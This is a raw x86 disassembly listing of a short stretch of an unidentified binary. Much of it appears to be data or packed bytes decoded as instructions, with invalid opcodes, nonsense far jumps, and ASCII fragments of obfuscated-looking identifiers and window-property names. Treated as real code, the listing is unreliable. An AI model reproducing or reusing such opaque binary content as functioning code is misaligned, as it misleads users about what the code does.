  41fbc9:	pushf  
  41fbca:	xor    BYTE PTR [ebp+0x3d],al
  41fbcd:	cli    
  41fbce:	xor    eax,0x895bc268
  41fbd3:	cmp    DWORD PTR [ebx],0xffffff8a
  41fbd6:	mov    dh,0x6c
  41fbd8:	add    BYTE PTR [esi-0x1c13e846],0xe6
  41fbdf:	adc    eax,0xaa52f43d
  41fbe4:	loopne 0x41fc44
  41fbe6:	out    0xba,eax
  41fbe8:	test   eax,ebp
  41fbea:	aam    0xe4
  41fbec:	addr16 push ebp
  41fbee:	lea    ebx,[ebp-0x1a018522]
  41fbf4:	stos   BYTE PTR es:[edi],al
  41fbf5:	add    ecx,DWORD PTR [ecx+0x3d]
  41fbf8:	jns    0x41fc53
  41fbfa:	addr16 call 0x8ec3:0x5e8e1b94
  41fc02:	lea    esi,[ecx-0x5f391a5c]
  41fc08:	daa    
  41fc09:	push   cs
  41fc0a:	inc    eax
  41fc0b:	jge    0x41fbf5
  41fc0d:	mov    esp,0xb0d44702
  41fc12:	(bad)  
  41fc13:	fwait
  41fc14:	sti    
  41fc15:	loope  0x41fc11
  41fc17:	or     eax,0x472e59ec
  41fc1c:	retf   0x8d59
  41fc1f:	sub    eax,DWORD PTR [eax-0x4b]
  41fc22:	sbb    al,0x38
  41fc24:	daa    
  41fc25:	ret    
  41fc26:	jmp    0x41fbec
  41fc28:	lea    esp,[ebp-0xa]
  41fc2b:	aad    0x8f
  41fc2d:	pop    esp
  41fc2e:	loope  0x41fc19
	...
  41fc38:	add    BYTE PTR [eax],al
  41fc3a:	add    cl,bh
  41fc3c:	sbb    al,al
  41fc3e:	inc    esi
  41fc3f:	jecxz  0x41fc1f
  41fc41:	(bad)  
  41fc42:	mov    edi,0xe1f1bc83
  41fc47:	sti    
  41fc48:	test   eax,0xa8d3199c
  41fc4d:	add    DWORD PTR [eax],eax
  41fc4f:	lods   eax,DWORD PTR ds:[esi]
  41fc50:	add    BYTE PTR [eax],al
  41fc52:	add    dl,ah
  41fc54:	call   0xaf2d7a8f
  41fc59:	cld    
  41fc5a:	loope  0x41fc04
  41fc5c:	jmp    0xab25:0x1ab9acac
  41fc63:	enter  0xdae5,0x6b
  41fc67:	bound  edi,QWORD PTR [ecx+0x70]
  41fc6a:	push   ss
  41fc6b:	ret    0x27cd
  41fc6e:	mov    ebx,0x4e31e461
  41fc73:	add    ah,dl
  41fc75:	in     eax,dx
  41fc76:	or     esi,DWORD PTR [esi+ebp*2+0x47]
  41fc7a:	adc    BYTE PTR [ebp+0x7f6ca35f],ah
  41fc80:	pushf  
  41fc81:	test   eax,0x123fa268
  41fc86:	lock push esi
  41fc88:	adc    DWORD PTR [edx+ecx*2],ebp
  41fc8b:	adc    eax,0xa9a685b3
  41fc90:	jb     0x41fcc4
  41fc92:	sbb    edx,DWORD PTR [edx]
  41fc94:	and    DWORD PTR [eax-0xa0b1b10],eax
  41fc9a:	lds    eax,FWORD PTR [ebx-0x63]
  41fc9d:	out    0xdb,al
  41fc9f:	push   cs
  41fca0:	rcl    DWORD PTR [ecx],1
  41fca2:	loopne 0x41fcb1
  41fca4:	sahf   
  41fca5:	mov    BYTE PTR [ebx],ch
  41fca7:	sbb    eax,0xdf70dc1
  41fcac:	cmp    edx,ebp
  41fcae:	jle    0x41fc63
  41fcb0:	dec    ecx
  41fcb1:	mov    ds:0x8699b016,al
  41fcb6:	inc    eax
  41fcb7:	ffreep st(1)
  41fcb9:	repz dec esi
  41fcbb:	daa    
  41fcbc:	dec    eax
  41fcbd:	xchg   ebp,eax
  41fcbe:	jle    0x41fc73
  41fcc0:	pop    edx
  41fcc1:	xor    BYTE PTR [edi+ebp*4+0x4d],ch
  41fcc5:	imul   BYTE PTR es:[edi+0x1e]
  41fcc9:	sar    BYTE PTR [eax+edx*1+0x428a6ad1],0xcb
  41fcd1:	ret    
  41fcd2:	loope  0x41fc9c
  41fcd4:	pop    ecx
  41fcd5:	aaa    
  41fcd6:	cmc    
  41fcd7:	jmp    0xa183b27a
  41fcdc:	gs cmc 
  41fcde:	repz inc ebx
  41fce0:	je     0x41fcfe
  41fce2:	stos   BYTE PTR es:[edi],al
  41fce3:	cmp    dl,bl
  41fce5:	ins    DWORD PTR es:[edi],dx
  41fce6:	int3   
  41fce7:	add    DWORD PTR [esi-0x6a],ecx
  41fcea:	add    ah,al
  41fcec:	xor    BYTE PTR [edx],0x28
  41fcef:	dec    ebp
  41fcf0:	cli    
  41fcf1:	test   al,0x31
  41fcf3:	sub    edi,DWORD PTR [esi+0x7d32f147]
  41fcf9:	out    0xb9,eax
  41fcfb:	jg     0x41fcda
  41fcfd:	fwait
  41fcfe:	inc    ecx
  41fcff:	push   esp
	...
  41fd08:	add    BYTE PTR [eax],al
  41fd0a:	add    BYTE PTR [ecx+0x3e8336b9],ah
  41fd10:	(bad)  
  41fd11:	mov    ch,0xbb
  41fd13:	icebp  
  41fd14:	and    eax,0xde558c27
  41fd19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd1a:	mov    edx,0x1a980
  41fd1f:	lods   eax,DWORD PTR ds:[esi]
  41fd20:	add    BYTE PTR [eax],al
  41fd22:	add    BYTE PTR [edx+0x6a],dl
  41fd25:	ss sub ch,bl
  41fd28:	inc    ebx
  41fd29:	cmc    
  41fd2a:	es cs push esp
  41fd2d:	les    ecx,FWORD PTR [esi]
  41fd2f:	and    DWORD PTR [ecx],0xffffffdd
  41fd32:	stos   BYTE PTR es:[edi],al
  41fd33:	jle    0x41fd63
  41fd35:	or     esi,ebx
  41fd37:	stos   DWORD PTR es:[edi],eax
  41fd38:	ret    0x92c9
  41fd3b:	data16 (bad) 
  41fd3e:	(bad)  
  41fd3f:	mov    ebx,0x23502d18
  41fd44:	adc    DWORD PTR [eax+edx*1],esi
  41fd47:	mov    edi,0xa6cea51e
  41fd4c:	and    ch,ah
  41fd4e:	jae    0x41fd24
  41fd50:	pop    es
  41fd51:	popa   
  41fd52:	dec    eax
  41fd54:	outs   dx,BYTE PTR ds:[esi]
  41fd55:	mov    dl,0x98
  41fd57:	shl    BYTE PTR [eax+eax*2+0x5ee33c49],0xfd
  41fd5f:	mov    edi,0x6162de3e
  41fd64:	or     eax,0x4c7d9a76
  41fd69:	cmp    DWORD PTR ds:0x1fca844e,eax
  41fd6f:	add    DWORD PTR [edi+0x7eafdd4f],ecx
  41fd75:	sti    
  41fd76:	cmp    al,0xa2
  41fd78:	or     edi,DWORD PTR [ebp-0x49]
  41fd7b:	and    al,0x14
  41fd7d:	or     ebp,esp
  41fd7f:	popf   
  41fd80:	fs loop 0x41fd79
  41fd83:	ins    BYTE PTR es:[edi],dx
  41fd84:	pop    ecx
  41fd85:	repnz mov eax,DWORD PTR [eax+0x61ac0196]
  41fd8c:	fadd   st,st(4)
  41fd8e:	xor    al,0x96
  41fd90:	outs   dx,DWORD PTR ds:[esi]
  41fd91:	hlt    
  41fd92:	enter  0x179f,0x78
  41fd96:	add    cl,BYTE PTR [esi-0x8116d17]
  41fd9c:	or     edx,DWORD PTR [esi+0x28]
  41fd9f:	xchg   esp,eax
  41fda0:	push   0x6
  41fda2:	fcmovne st,st(7)
  41fda4:	adc    BYTE PTR [eax],dl
  41fda6:	cwde   
  41fda7:	fdivr  st,st(2)
  41fda9:	push   esp
  41fdaa:	aaa    
  41fdab:	ror    BYTE PTR [edx-0x66],0xa9
  41fdaf:	mov    bh,cl
  41fdb1:	jp     0x41fddf
  41fdb3:	leave  
  41fdb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdb5:	out    dx,al
  41fdb6:	sub    DWORD PTR [ebp+0x27e8cbea],eax
  41fdbc:	std    
  41fdbd:	gs bnd jmp 0x3f3a3d55
  41fdc4:	sbb    BYTE PTR ds:0x1f29ad38,ah
  41fdca:	repnz and al,0xcb
  41fdcd:	dec    esp
  41fdce:	outs   dx,DWORD PTR ds:[esi]
  41fdcf:	jo     0x41fdd1
	...
  41fdd9:	add    BYTE PTR [eax],al
  41fddb:	adc    dl,bh
  41fddd:	repz or esi,edi
  41fde0:	das    
  41fde1:	cli    
  41fde2:	fist   WORD PTR [ecx]
  41fde4:	dec    ebx
  41fde5:	es nop
  41fde7:	std    
  41fde8:	daa    
  41fde9:	loop   0x41fe4d
  41fdeb:	sub    eax,0xad0001aa
  41fdf0:	add    BYTE PTR [eax],al
  41fdf2:	add    BYTE PTR [ebx],bh
  41fdf4:	add    al,BYTE PTR [edi]
  41fdf6:	popa   
  41fdf7:	rcl    BYTE PTR [ecx+0x3155bbb],1
  41fdfd:	stc    
  41fdfe:	sub    eax,0x14fdbb70
  41fe03:	dec    ebx
  41fe04:	stos   BYTE PTR es:[edi],al
  41fe05:	push   cs
  41fe06:	or     BYTE PTR [ebp+0x67],0x7
  41fe0a:	mov    ch,0x33
  41fe0c:	sahf   
  41fe0d:	int3   
  41fe0e:	shl    bh,1
  41fe10:	mov    eax,0xc46c3bac
  41fe15:	int3   
  41fe16:	in     al,dx
  41fe17:	je     0x41fe41
  41fe19:	in     al,dx
  41fe1a:	dec    esp
  41fe1b:	sbb    al,0xec
  41fe1d:	enter  0x42cd,0xdd
  41fe21:	in     eax,0x8b
  41fe23:	retf   
  41fe24:	mov    eax,0xfcfb9b1c
  41fe29:	mov    ebp,0x72fbf1e9
  41fe2e:	imul   esp,edi,0xffffffe1
  41fe31:	adc    DWORD PTR [ebp-0x7],ebx
  41fe34:	mov    dh,0x37
  41fe36:	lods   eax,DWORD PTR ds:[esi]
  41fe37:	(bad)  
  41fe38:	cmc    
  41fe39:	adc    DWORD PTR [esp+ebx*1+0x1b],esi
  41fe3d:	pushf  
  41fe3e:	stos   DWORD PTR es:[edi],eax
  41fe3f:	in     al,dx
  41fe40:	push   es
  41fe41:	inc    edx
  41fe42:	imul   eax,edi,0xffffffa0
  41fe45:	and    bh,BYTE PTR [ebp-0x7513d8ae]
  41fe4b:	imul   ebp,DWORD PTR [edx-0x50],0xd004f684
  41fe52:	nop
  41fe53:	scas   al,BYTE PTR es:[edi]
  41fe54:	push   ds
  41fe55:	cdq    
  41fe56:	mov    dh,0xf
  41fe58:	mov    al,ds:0xb2bd5998
  41fe5d:	sub    BYTE PTR [ecx-0x2bc05de0],0x97
  41fe64:	fisttp QWORD PTR [ebx+0x4e]
  41fe67:	push   eax
  41fe68:	retf   
  41fe69:	dec    ecx
  41fe6a:	push   0xb00a8d05
  41fe6f:	(bad)  
  41fe70:	lods   al,BYTE PTR ds:[esi]
  41fe71:	lahf   
  41fe72:	loope  0x41fe93
  41fe74:	ins    BYTE PTR es:[edi],dx
  41fe75:	test   DWORD PTR [edx+0x75],ecx
  41fe78:	leave  
  41fe79:	cld    
  41fe7a:	jnp    0x41fe00
  41fe7c:	out    0xd6,eax
  41fe7e:	inc    ebx
  41fe7f:	xchg   ebx,eax
  41fe80:	add    al,0x2d
  41fe82:	fidiv  DWORD PTR [ebx]
  41fe84:	sahf   
  41fe85:	sub    BYTE PTR [edx-0xf],ch
  41fe88:	xchg   edx,eax
  41fe89:	or     BYTE PTR [ebx+edx*4],ah
  41fe8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe8e:	push   ebp
  41fe8f:	out    dx,eax
  41fe90:	jmp    0x7057b6b4
  41fe95:	inc    ebp
  41fe96:	xor    bh,0xff
  41fe99:	mov    BYTE PTR [edx+0x5b7bf03a],bh
  41fe9f:	dec    eax
	...
  41feac:	nop
  41fead:	inc    edx
  41feae:	add    BYTE PTR [eax+edx*4],al
  41feb1:	inc    edx
  41feb2:	add    BYTE PTR [eax],cl
  41feb4:	nop
  41feb5:	inc    edx
  41feb6:	add    BYTE PTR [eax+edx*4],cl
  41feb9:	inc    edx
  41feba:	add    BYTE PTR [eax],dl
  41febc:	nop
  41febd:	inc    edx
  41febe:	add    BYTE PTR [eax+edx*4],dl
  41fec1:	inc    edx
  41fec2:	add    BYTE PTR [eax],bl
  41fec4:	nop
  41fec5:	inc    edx
  41fec6:	add    BYTE PTR [eax+edx*4],bl
  41fec9:	inc    edx
  41feca:	add    BYTE PTR [esi+0x49],cl
  41fecd:	dec    esi
  41fece:	pop    edi
  41fecf:	pop    edx
  41fed0:	dec    edx
  41fed1:	inc    ecx
  41fed2:	xor    eax,DWORD PTR [eax]
  41fed4:	push   ebx
  41fed5:	push   edi
  41fed6:	inc    edi
  41fed7:	cmp    DWORD PTR [edi+0x41],ebx
  41feda:	pop    eax
  41fedb:	ss push esi
  41fedd:	pop    ecx
  41fede:	add    BYTE PTR [ebx+0x43],dl
  41fee1:	inc    ebp
  41fee2:	pop    edi
  41fee3:	inc    ecx
  41fee4:	pop    eax
  41fee5:	push   edi
  41fee6:	dec    eax
  41fee7:	inc    edx
  41fee8:	pop    edi
  41fee9:	cmp    DWORD PTR [ecx+0x4d],ecx
  41feec:	dec    ecx
  41feed:	add    BYTE PTR [ecx+0x46],al
  41fef0:	cmp    DWORD PTR [edx],esi
  41fef2:	xor    ebx,DWORD PTR [edi+0x32]
  41fef5:	aaa    
  41fef6:	inc    esp
  41fef7:	inc    esp
  41fef8:	pop    edi
  41fef9:	xor    eax,0x41545800
  41fefe:	pop    edi
  41feff:	push   ecx
  41ff00:	push   esp
  41ff01:	inc    esi
  41ff02:	push   ebp
  41ff03:	cmp    DWORD PTR [eax],eax
  41ff05:	push   edi
  41ff06:	push   ebp
  41ff07:	inc    ecx
  41ff08:	xor    dh,BYTE PTR [ebx]
  41ff0a:	xor    ebx,DWORD PTR [edi+0x4e]
  41ff0d:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  41ff11:	cmp    DWORD PTR [edi+0x38],ebx
  41ff14:	dec    ecx
  41ff15:	cmp    DWORD PTR [edx+0x36],ebx
  41ff18:	pop    edi
  41ff19:	dec    edx
  41ff1a:	xor    BYTE PTR [edx+0x34],cl
  41ff1d:	add    BYTE PTR [ecx+eax*2+0x34],cl
  41ff21:	xor    esi,DWORD PTR [eax]
  41ff23:	pop    edi
  41ff24:	inc    edx
  41ff25:	dec    ebx
  41ff26:	pop    eax
  41ff27:	pop    eax
  41ff28:	xor    eax,0x51414d00
  41ff2d:	pop    edi
  41ff2e:	inc    ecx
  41ff2f:	xor    al,BYTE PTR [ebp+0x5f]
  41ff32:	inc    ecx
  41ff33:	dec    ebx
  41ff34:	cmp    DWORD PTR ds:0x5a003939,esi
  41ff3a:	inc    ebp
  41ff3b:	cmp    BYTE PTR [edi+0x4d],bl
  41ff3e:	ss dec eax
  41ff40:	dec    ebx
  41ff41:	add    BYTE PTR [ebp+0x57],al
  41ff44:	xor    DWORD PTR [edi+0x31],ebx
  41ff47:	dec    ebx
  41ff48:	xor    eax,DWORD PTR [ecx+0x30]
  41ff4b:	push   ebx
  41ff4c:	add    BYTE PTR [edx+esi*1+0x36],al
  41ff50:	aaa    
  41ff51:	pop    edi
  41ff52:	push   edx
  41ff53:	dec    eax
  41ff54:	dec    ebp
  41ff55:	cmp    BYTE PTR [edi+0x37],bl
  41ff58:	inc    esi
  41ff59:	xor    eax,0x35005500
  41ff5e:	add    BYTE PTR [ebx+0x0],al
  41ff61:	pop    edi
  41ff62:	add    BYTE PTR [ecx+0x0],bl
  41ff65:	dec    ecx
  41ff66:	add    BYTE PTR [ebx+0x0],dl
  41ff69:	xor    al,BYTE PTR [eax]
  41ff6b:	pop    edi
  41ff6c:	add    BYTE PTR [edx+0x0],dl
  41ff6f:	add    BYTE PTR [eax],al
  41ff71:	push   eax
  41ff72:	add    BYTE PTR [ebp+0x0],dl
  41ff75:	dec    ecx
  41ff76:	add    BYTE PTR [eax],dh
  41ff78:	add    BYTE PTR [edi+0x0],bl
  41ff7b:	inc    ebx
  41ff7c:	add    BYTE PTR [esi],dh
  41ff7e:	add    BYTE PTR [ebp+0x0],al
  41ff81:	xor    al,BYTE PTR [eax]
  41ff83:	pop    edi
  41ff84:	add    BYTE PTR [ebp+0x0],cl
  41ff87:	xor    al,0x0
  41ff89:	dec    edx
  41ff8a:	add    BYTE PTR [edx+0x0],dl
  41ff8d:	push   ebp
  41ff8e:	add    BYTE PTR [eax],al
  41ff90:	add    BYTE PTR [esi+0x0],cl
  41ff93:	cmp    DWORD PTR [eax],eax
  41ff95:	push   eax
  41ff96:	add    BYTE PTR [edi+0x0],bl
  41ff99:	push   ebp
  41ff9a:	add    BYTE PTR [ecx],bh
  41ff9c:	add    BYTE PTR [esi],dh
  41ff9e:	add    BYTE PTR [eax],dh
  41ffa0:	add    BYTE PTR [ecx],dh
  41ffa2:	add    BYTE PTR [edi+0x0],bl
  41ffa5:	dec    edi
  41ffa6:	add    BYTE PTR [esi+0x0],cl
  41ffa9:	push   esp
  41ffaa:	add    BYTE PTR [eax],bh
  41ffac:	add    BYTE PTR [eax],al
  41ffae:	add    BYTE PTR [eax+eax*1+0x34],cl
  41ffb2:	add    BYTE PTR [eax+eax*1+0x31],al
  41ffb6:	add    BYTE PTR [edi+0x0],bl
  41ffb9:	dec    ebx
  41ffba:	add    BYTE PTR [ecx],dh
  41ffbc:	add    BYTE PTR [ebp+0x0],al
  41ffbf:	pop    edi
  41ffc0:	add    BYTE PTR [edx+0x0],bl
  41ffc3:	add    BYTE PTR [eax],al
  41ffc5:	push   esp
  41ffc6:	add    BYTE PTR [edi],dh
  41ffc8:	add    BYTE PTR [ebx+0x0],al
  41ffcb:	pop    edi
  41ffcc:	add    BYTE PTR [edx+0x0],al
  41ffcf:	xor    al,BYTE PTR [eax]
  41ffd1:	xor    DWORD PTR [eax],eax
  41ffd3:	push   ebx
  41ffd4:	add    BYTE PTR [ecx],dh
  41ffd6:	add    BYTE PTR [ecx],bh
  41ffd8:	add    BYTE PTR [edx+0x0],al
  41ffdb:	add    BYTE PTR [eax],al
  41ffdd:	inc    edi
  41ffde:	add    BYTE PTR [ebp+0x0],al
  41ffe1:	xor    al,0x0
  41ffe3:	cmp    BYTE PTR [eax],al
  41ffe5:	add    BYTE PTR [eax],al
  41ffe7:	add    BYTE PTR [eax+0x42],dl
  41ffea:	add    BYTE PTR [eax+edx*2],al
  41ffed:	inc    edx
  41ffee:	add    BYTE PTR [eax],cl
  41fff0:	push   eax
  41fff1:	inc    edx
  41fff2:	add    BYTE PTR [eax+edx*2],cl
  41fff5:	inc    edx
  41fff6:	add    BYTE PTR [eax],dl
  41fff8:	push   eax
  41fff9:	inc    edx
  41fffa:	add    BYTE PTR [eax+edx*2],dl
  41fffd:	inc    edx
  41fffe:	add    BYTE PTR [eax],bl
  420000:	push   eax
  420001:	inc    edx
  420002:	add    BYTE PTR [eax+edx*2],bl
  420005:	inc    edx
  420006:	add    BYTE PTR [eax],ah
  420008:	push   eax
  420009:	inc    edx
  42000a:	add    BYTE PTR [eax+edx*2],ah
  42000d:	inc    edx
  42000e:	add    BYTE PTR [eax],ch
  420010:	push   eax
  420011:	inc    edx
	...
  420022:	add    BYTE PTR [eax],al
  420024:	call   0x0:0x4d3ef2
  42002b:	add    BYTE PTR [edx+0x0],dl
  42002e:	add    al,BYTE PTR [eax]
  420030:	add    DWORD PTR [eax],eax
  420032:	add    BYTE PTR [eax],al
  420034:	add    DWORD PTR [eax],eax
  420036:	add    BYTE PTR [eax],al
  420038:	add    DWORD PTR [eax],eax
  42003a:	add    BYTE PTR [eax],al
  42003c:	dec    eax
  42003d:	add    BYTE PTR [edx],al
  42003f:	add    BYTE PTR [eax+eax*1+0x2],cl
  420043:	add    BYTE PTR [eax+0x0],dl
  420046:	add    al,BYTE PTR [eax]
  420048:	fdivr  QWORD PTR [eax+eax*1]
  42004b:	add    BYTE PTR [esi+0x0],bl
  42004e:	add    al,BYTE PTR [eax]
  420050:	add    BYTE PTR [eax],al
  420052:	push   edi
  420053:	outs   dx,DWORD PTR ds:[esi]
  420054:	jb     0x4200ba
  420056:	push   edi
  420057:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42005e:	aas    
  42005f:	inc    ebx
  420060:	ins    BYTE PTR es:[edi],dx
  420061:	outs   dx,DWORD PTR ds:[esi]
  420062:	jae    0x4200c9
  420064:	push   edi
  420065:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42006c:	popa   
  42006d:	je     0x4200d8
  42006f:	outs   dx,DWORD PTR ds:[esi]
  420070:	outs   dx,BYTE PTR ds:[esi]
  420071:	inc    ebx
  420072:	ins    BYTE PTR es:[edi],dx
  420073:	outs   dx,DWORD PTR ds:[esi]
  420074:	jae    0x4200db
  420076:	push   edi
  420077:	imul   eax,DWORD PTR [eax],0x0
	...
